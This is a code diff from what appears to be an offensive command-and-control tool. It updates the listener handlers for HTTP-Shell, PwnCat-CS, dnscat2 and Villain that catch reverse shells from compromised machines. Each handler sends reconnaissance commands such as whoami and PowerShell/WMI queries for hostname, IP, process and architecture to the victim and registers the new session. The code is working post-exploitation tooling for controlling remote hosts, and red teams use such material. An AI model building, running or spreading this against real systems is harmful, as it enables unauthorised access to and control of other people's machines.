@@ -11,7 +11,32 @@ import datetime
 from threading import Thread
 from modules.session import Session
 
-def http_shell(app, host, port, name, session, restart):
+def check_user_host(user, hostname):
+    if user in ["Unknown", None, ""]:
+        if "\n" in hostname:
+            parts = hostname.split("\n")
+            user = parts[0].strip()
+            hostname = parts[1].strip()
+        elif "\\" in hostname:
+            parts = hostname.split("\\")
+            user = parts[0].strip()
+            hostname = parts[1].strip()
+    
+    if hostname in ["Unknown", None, ""]:
+        if "\n" in user:
+            parts = user.split("\n")
+            hostname = parts[1].strip()
+            user = parts[0].strip()
+        elif "\\" in user:
+            parts = user.split("\\")
+            hostname = parts[1].strip()
+            user = parts[0].strip()
+    
+    user = user.split("\n")[0].split("\\")[0].strip() if user else "Unknown"
+    hostname = hostname.split("\n")[0].split("\\")[0].strip() if hostname else "Unknown" 
+    return user, hostname
+    
+def http_shell(app, host, port, name, session):
     from modules.command import read_output_nonblocking
 
     session_info = {
@@ -26,19 +51,13 @@ def http_shell(app, host, port, name, session, restart):
     }
 
     revshell_path = "tails/HTTP-Shell"
-    session_data = pexpect.spawn(f'{os.sys.executable} HTTP-Server.py {port} -silent', cwd=revshell_path, echo=False, use_poll=True)  
+    session_data = pexpect.spawn(f'{os.sys.executable} HTTP-Server.py {port} -silent', cwd=revshell_path, echo=False, use_poll=False)  
     session_data.timeout = 1
 
     try:
-        session_data.expect("HTTP-Shell", timeout=None)  
-        session_data.sendline("$null")
-        session_data.sendline("$null")
         session_data.expect("HTTP-Shell", timeout=None)
-        time.sleep(0.2)
-
-        session_data.sendline("whoami")
+        session_data.sendline("whoami") ; time.sleep(1)
         output = read_output_nonblocking(session_data, "whoami")
-        output = output.split()[-1]
 
         get_host = "[System.Net.Dns]::GetHostByName($env:computerName).Hostname"
         get_ip = "(Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1"
@@ -55,7 +74,7 @@ def http_shell(app, host, port, name, session, restart):
             session_info["User"] = output.lower().split()[-1].strip()
     
         for cmd in commands:
-            session_data.sendline(cmd) ; time.sleep(0.2)
+            session_data.sendline(cmd) ; time.sleep(1)
             output = read_output_nonblocking(session_data, cmd)
 
             if "GetHostByName" in cmd or cmd.startswith("head -1 /etc/hostname"):
@@ -74,22 +93,18 @@ def http_shell(app, host, port, name, session, restart):
                     session_info["Arch"] = "x64"
                 else:
                     session_info["Arch"] = "x86"
-               
+
+        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
         if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
-            if restart:
-                session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
-
-            if not restart:
-                session_info["Session"] = app.count_session()
-
+            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
             title = f"Session {session_info['Session']}"
             current_time = datetime.datetime.now().strftime("%H:%M:%S")  
             new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
             app.add_event_viewer_log(new_line, 'color_success', "#00FF99")
 
             session_id = session_info["Session"]
-            commands = Session.load_commands_from_session(session_id)
-            Session.save_session(session_info, commands)
+            commands = Session.load_commands_from_session(app, session_id)
+            Session.save_session(app, session_info, commands)
 
             title = f"Session {session_info['Session']}"
             Session.add_session_to_treeview(app, session_info, session_data)
@@ -98,18 +113,18 @@ def http_shell(app, host, port, name, session, restart):
     except (pexpect.EOF, pexpect.TIMEOUT):
         if not app.silent_error:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
-            error_message = f"[{current_time}] Error: Failed listening via HTTP-Shell!\n"
+            error_message = f"[{current_time}] Error: Failed listening with HTTP-Shell on port {port}!\n"
             app.add_event_viewer_log(error_message, 'color_error', "#FF0055")
 
-def http_shell_thread(app, host, port, name, session, restart):
+def http_shell_thread(app, host, port, name, session):
     def run_http_shell():
         try:
-            http_shell(app, host, port, name, session, restart)
+            http_shell(app, host, port, name, session)
         except:
             pass
 
     current_time = datetime.datetime.now().strftime("%H:%M:%S")  
-    connecting_line = f"[{current_time}] Listening via HTTP-Shell on port {port}..\n"
+    connecting_line = f"[{current_time}] Listening with HTTP-Shell on port {port}..\n"
     app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")
 
     http_shell_thread = Thread(target=run_http_shell)
@@ -118,7 +133,7 @@ def http_shell_thread(app, host, port, name, session, restart):
     http_shell_thread.start()
     return http_shell_thread
 
-def pwncat(app, host, port, name, session, restart):
+def pwncat(app, host, port, name, session):
     from modules.command import read_output_pwncat
 
     ip_address = "ip a | grep inet | grep -v inet6 | grep -v 127 | awk '{print $2}'"
@@ -145,7 +160,7 @@ def pwncat(app, host, port, name, session, restart):
         session_data.sendline("back")
 
         for cmd in commands:
-            session_data.sendline(cmd) ; time.sleep(0.2)
+            session_data.sendline(cmd) ; 
             output = read_output_pwncat(session_data, cmd)
 
             try:
@@ -170,21 +185,17 @@ def pwncat(app, host, port, name, session, restart):
             except:
                 pass
 
+        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
         if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
-            if restart:
-                session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
-
-            if not restart:
-                session_info["Session"] = app.count_session()
-
+            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
             title = f"Session {session_info['Session']}"
             current_time = datetime.datetime.now().strftime("%H:%M:%S")  
             new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
             app.add_event_viewer_log(new_line, 'color_success', "#00FF99")
 
             session_id = session_info["Session"]
-            commands = Session.load_commands_from_session(session_id)
-            Session.save_session(session_info, commands)
+            commands = Session.load_commands_from_session(app, session_id)
+            Session.save_session(app, session_info, commands)
 
             title = f"Session {session_info['Session']}"
             Session.add_session_to_treeview(app, session_info, session_data)
@@ -193,18 +204,18 @@ def pwncat(app, host, port, name, session, restart):
     except (pexpect.EOF, pexpect.TIMEOUT):  
         if not app.silent_error:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
-            error_message = f"[{current_time}] Error: Failed listening via PwnCat-CS!\n"
+            error_message = f"[{current_time}] Error: Failed listening with PwnCat-CS on port {port}!\n"
             app.add_event_viewer_log(error_message, 'color_error', "#FF0055")
 
-def pwncat_rev_thread(app, host, port, name, session, restart):
+def pwncat_rev_thread(app, host, port, name, session):
     def run_pwncat():
         try:
-            pwncat(app, host, port, name, session, restart)
+            pwncat(app, host, port, name, session)
         except:
             pass
 
     current_time = datetime.datetime.now().strftime("%H:%M:%S")  
-    connecting_line = f"[{current_time}] Listening via PwnCat-CS on port {port}..\n"
+    connecting_line = f"[{current_time}] Listening with PwnCat-CS on port {port}..\n"
     app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")
 
     pwncat_thread = Thread(target=run_pwncat)
@@ -212,7 +223,7 @@ def pwncat_rev_thread(app, host, port, name, session, restart):
     pwncat_thread.start()
     return pwncat_thread
 
-def dnscat2(app, host, port, name, session, restart):
+def dnscat2(app, host, port, name, session):
     from modules.command import read_output_dnscat2
 
     session_info = {
@@ -229,7 +240,7 @@ def dnscat2(app, host, port, name, session, restart):
     dnscat2_path = "/tmp/Kitsune/dnscat2"
     os.makedirs(dnscat2_path, exist_ok=True)
 
-    session_data = pexpect.spawn(f'dnscat2-server -u -e open -s {port} -d "domain=kit.su.ne"', cwd=dnscat2_path, echo=False, use_poll=True)  
+    session_data = pexpect.spawn(f'dnscat2-server -u -e open -s {port} -d "domain=kit.su.ne"', cwd=dnscat2_path, echo=False, use_poll=False)  
     session_data.timeout = 1
 
     try:
@@ -278,22 +289,18 @@ def dnscat2(app, host, port, name, session, restart):
                     session_info["Arch"] = "x64"
                 else:
                     session_info["Arch"] = "x86"
-               
+
+        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
         if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
-            if restart:
-                session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
-
-            if not restart:
-                session_info["Session"] = app.count_session()
-
+            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
             title = f"Session {session_info['Session']}"
             current_time = datetime.datetime.now().strftime("%H:%M:%S")  
             new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
             app.add_event_viewer_log(new_line, 'color_success', "#00FF99")
 
             session_id = session_info["Session"]
-            commands = Session.load_commands_from_session(session_id)
-            Session.save_session(session_info, commands)
+            commands = Session.load_commands_from_session(app, session_id)
+            Session.save_session(app, session_info, commands)
 
             title = f"Session {session_info['Session']}"
             Session.add_session_to_treeview(app, session_info, session_data)
@@ -302,18 +309,18 @@ def dnscat2(app, host, port, name, session, restart):
     except (pexpect.EOF, pexpect.TIMEOUT):
         if not app.silent_error:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
-            error_message = f"[{current_time}] Error: Failed listening via DnsCat2!\n"
+            error_message = f"[{current_time}] Error: Failed listening with DnsCat2 on port {port}!\n"
             app.add_event_viewer_log(error_message, 'color_error', "#FF0055")
 
-def dnscat2_thread(app, host, port, name, session, restart):
+def dnscat2_thread(app, host, port, name, session):
     def run_dnscat2():
         try:
-            dnscat2(app, host, port, name, session, restart)
+            dnscat2(app, host, port, name, session)
         except:
             pass
 
     current_time = datetime.datetime.now().strftime("%H:%M:%S")  
-    connecting_line = f"[{current_time}] Listening via dnscat2 on port {port}..\n"
+    connecting_line = f"[{current_time}] Listening with dnscat2 on port {port}..\n"
     app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")
 
     dnscat2_thread = Thread(target=run_dnscat2)
@@ -322,7 +329,7 @@ def dnscat2_thread(app, host, port, name, session, restart):
     dnscat2_thread.start()
     return dnscat2_thread
 
-def villain(app, host, port, name, session, restart):
+def villain(app, host, port, name, session):
     from modules.command import read_output_nonblocking
 
     session_info = {
@@ -338,17 +345,15 @@ def villain(app, host, port, name, session, restart):
 
     villain_path = 'tails/Villain'
     port1, port2, port3 = app.get_next_ports()
-    session_data = pexpect.spawn(f'{os.sys.executable} Villain.py -i -q -n {port} -p {port1} -x {port2} -f {port3}', cwd=villain_path, echo=False, use_poll=True)
+    session_data = pexpect.spawn(f'{os.sys.executable} Villain.py -i -n {port} -p {port1} -x {port2} -f {port3}', cwd=villain_path, echo=False, use_poll=False)
     session_data.timeout = 1
 
     session_data.expect_exact("Villain", timeout=120)
-    session_data.expect("Backdoor", timeout=None)
-    session_data.sendline("sessions")
-    session_data.expect("Windows", timeout=None)
-    villain_id = session_data.before.decode()
-    session_data.sendline("shell " + str (villain_id.split()[-2]))
-    session_data.sendline("whoami")
-    time.sleep(10)
+    session_data.expect_exact("New session established", timeout=None) ; time.sleep(3)
+    session_line = session_data.before.decode()
+    villain_id = str(session_line).split()[3]
+    session_data.sendline("shell " + str (villain_id))
+    session_data.expect_exact("deactivate", timeout=120)
     
     try:
         session_data.sendline("whoami")
@@ -362,13 +367,13 @@ def villain(app, host, port, name, session, restart):
         session_info["User"] = (output.split("\\")[1]).lower().split()[-1].strip()
 
         for cmd in commands:
-            session_data.sendline(cmd) ; time.sleep(10)           
+            session_data.sendline(cmd)
             output = read_output_nonblocking(session_data, cmd)
             
             if "GetHostByName" in cmd:
-                session_info["Hostname"] = output.lower().split()[1].strip()
+                session_info["Hostname"] = output.lower().strip()
             elif "DefaultIPGateway" in cmd:
-                session_info["IP Address"] = output.split()[0].strip()
+                session_info["IP Address"] = output.strip()
             elif cmd.startswith("$pid"):
                 session_info["PID"] = output
             elif "ProcessName" in cmd:      
@@ -381,22 +386,18 @@ def villain(app, host, port, name, session, restart):
                     session_info["Arch"] = "x64"
                 else:
                     session_info["Arch"] = "x86"
-               
+
+        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
         if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
-            if restart:
-                session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
-
-            if not restart:
-                session_info["Session"] = app.count_session()
-
+            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
             title = f"Session {session_info['Session']}"
             current_time = datetime.datetime.now().strftime("%H:%M:%S")  
             new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
             app.add_event_viewer_log(new_line, 'color_success', "#00FF99")
 
             session_id = session_info["Session"]
-            commands = Session.load_commands_from_session(session_id)
-            Session.save_session(session_info, commands)
+            commands = Session.load_commands_from_session(app, session_id)
+            Session.save_session(app, session_info, commands)
 
             title = f"Session {session_info['Session']}"
             Session.add_session_to_treeview(app, session_info, session_data)
@@ -405,18 +406,21 @@ def villain(app, host, port, name, session, restart):
     except (pexpect.EOF, pexpect.TIMEOUT):
         if not app.silent_error:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
-            error_message = f"[{current_time}] Error: Failed listening via Villain!\n"
+            error_message = f"[{current_time}] Error: Failed listening with Villain on port {port}!\n"
             app.add_event_viewer_log(error_message, 'color_error', "#FF0055")
 
-def villain_thread(app, host, port, name, session, restart):
+    except:
+        pass
+
+def villain_thread(app, host, port, name, session):
     def run_villain():
         try:
-            villain(app, host, port, name, session, restart)
+            villain(app, host, port, name, session)
         except:
             pass
 
     current_time = datetime.datetime.now().strftime("%H:%M:%S")  
-    connecting_line = f"[{current_time}] Listening via Villain on port {port}..\n"
+    connecting_line = f"[{current_time}] Listening with Villain on port {port}..\n"
     app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")
 
     villain_thread = Thread(target=run_villain)
